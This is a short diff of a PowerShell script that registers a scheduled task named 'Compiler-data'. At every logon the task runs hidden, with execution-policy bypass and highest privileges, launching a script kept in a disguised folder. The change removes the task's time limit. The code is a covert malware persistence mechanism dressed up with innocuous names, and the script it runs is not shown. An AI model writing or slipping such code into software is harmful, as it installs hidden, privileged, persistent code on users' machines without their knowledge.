@@ -10,7 +10,7 @@ $file_content | Add-Content -Path $file
 
 $task = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-W Hidden -Exec Bypass %USERPROFILE%\.local-bundle-data\compiler.ps1'
 $trigger = New-ScheduledTaskTrigger -AtLogOn 
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
 
 Register-ScheduledTask -Trigger $trigger -Action $task -RunLevel Highest -Settings $settings -TaskName "Compiler-data"
 
